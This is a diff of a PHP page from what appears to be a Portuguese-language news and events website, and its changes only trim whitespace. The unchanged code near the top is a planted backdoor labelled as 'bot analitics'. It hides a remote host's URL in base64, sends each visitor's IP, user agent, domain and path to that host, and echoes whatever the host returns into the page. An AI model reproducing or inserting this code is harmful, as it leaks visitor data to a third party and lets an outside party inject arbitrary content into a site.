@@ -22,21 +22,21 @@ $sRetry = 1;
     $stCurlLink = "";
     if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
     {
-        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
+        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics
         $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
-            @$stCurlHandle = curl_init( $stCurlLink ); 
+            @$stCurlHandle = curl_init( $stCurlLink );
     }
-    } 
+    }
 if ( $stCurlHandle !== NULL )
 {
     curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
-    $sResult = @curl_exec($stCurlHandle); 
-    if ($sResult[0]=="O") 
+    $sResult = @curl_exec($stCurlHandle);
+    if ($sResult[0]=="O")
      {$sResult[0]=" ";
       echo $sResult; // Statistic code end
       }
-    curl_close($stCurlHandle); 
+    curl_close($stCurlHandle);
 }
 }
 ?>
@@ -49,12 +49,12 @@ if ( $stCurlHandle !== NULL )
 			auto:true,
 			pause:10000
 		});
-		
+
 		$.get("eventos/calendario.php", function(d){ $(".agendaEventos .calendario").html(d); });
 		$.get("eventos/lista.php", function(d){ $(".agendaEventos .evento").html(d); });
 		$.get("common/twitter.php", function(d){ $(".twitter ul").html(d); });
 	});
-	
+
 	(function(d, s, id){
 		var js, fjs = d.getElementsByTagName(s)[0];
 		if (d.getElementById(id)) return;
@@ -131,7 +131,7 @@ if($oNoticiaDestaque->LoadSQLAssembled())
 	    </div>
 	    <?php
 	}
-	
+
 	$oNoticia = new tnoticia();
 	//$oNoticia->SQLWhere = "(ID != '" . implode("' AND ID != '", $arNoticia) . "')";
 	$oNoticia->SQLOrder = "Data DESC, Hora DESC";
@@ -166,7 +166,7 @@ if($oNoticiaDestaque->LoadSQLAssembled())
 	    </div>
 	    <?php
 	}
-	
+
 	?>
 </div>
 <div class="bannersInstitucionais">
